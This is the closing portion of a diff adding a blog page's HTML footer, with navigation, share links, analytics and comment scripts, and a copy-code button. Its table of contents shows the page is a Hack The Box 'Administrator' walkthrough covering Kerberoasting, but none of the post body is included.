+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/categories/">Category</a></li>
+        
+          <li><a href="/tags/">Tag</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+          <li><a href="/link/">Friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">域内信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Kerberoasting%E6%94%BB%E5%87%BB"><span class="toc-number">4.1.</span> <span class="toc-text">Kerberoasting攻击</span></a></li></ol></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/&text=Administrator-HTB"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/&title=Administrator-HTB"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/&is_video=false&description=Administrator-HTB"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Administrator-HTB&body=Check out this article: https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/&title=Administrator-HTB"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/&title=Administrator-HTB"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/&title=Administrator-HTB"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/&title=Administrator-HTB"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/&name=Administrator-HTB&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://oceanzbz.github.io/2025/03/02/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/HTB/Administrator/&t=Administrator-HTB"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Oceanzbz
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/link/">Friends</a></li><!--
+     -->
+      </ul>
+      <ul>
+        
+          <!-- 不蒜子统计 -->
+          <span id="busuanzi_container_site_pv">
+              本站总访问量<span id="busuanzi_value_site_pv"></span>次
+          </span>
+          <span class="post-meta-divider">|</span>
+          <span id="busuanzi_container_site_uv" style='display:none'>
+                  本站访客数<span id="busuanzi_value_site_uv"></span>人
+          </span>
+          <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        
+      </ul>
+    </nav>
+  </div>
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-QWTJSPQL4F"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-QWTJSPQL4F');
+</script>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'cactus-1';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+<!-- utterances Comments -->
+
+</body>
+</html>
